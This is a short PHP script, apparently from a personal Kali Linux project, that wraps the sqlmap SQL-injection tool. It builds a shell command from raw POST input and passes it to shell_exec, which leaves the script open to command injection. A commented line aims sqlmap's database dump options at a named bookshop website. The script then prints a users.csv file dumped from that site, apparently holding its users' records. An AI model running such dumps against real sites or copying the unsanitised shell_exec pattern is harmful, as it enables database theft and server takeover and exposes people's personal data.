<?php
//$cmd = 'sqlmap -u https://www.atholbooks-sales.org/add_cart.php?id=102 --dbs --batch --dump';
$stmt1 = '/usr/bin/sqlmap -u ';
$stmt2 = $_POST['answer'];
$cmd = $stmt1 . $stmt2;
$out = shell_exec($cmd);
$out2 = shell_exec('pwd');
exec('# /usr/bin/sqlmap --version',$out1,$r);
$file = fopen("/home/kali/Project/www.atholbooks-sales.org/dump/heresia_atholbooks/users.csv","r");
while(! feof($file))
  {
  print_r(fgetcsv($file));
  echo "<br>";
  }
fclose($file);
//echo $cmd.'<br>';
//print_r($r);
//print_r($out1);
//echo $out2;
/*$myfile=fopen('/home/kali/.local/share/sqlmap/output/www.atholbooks-sales.org/log','r');
echo fread($myfile,filesize('/home/kali/.local/share/sqlmap/output/www.atholbooks-sales.org/log'));
fclose($myfile);*/

?>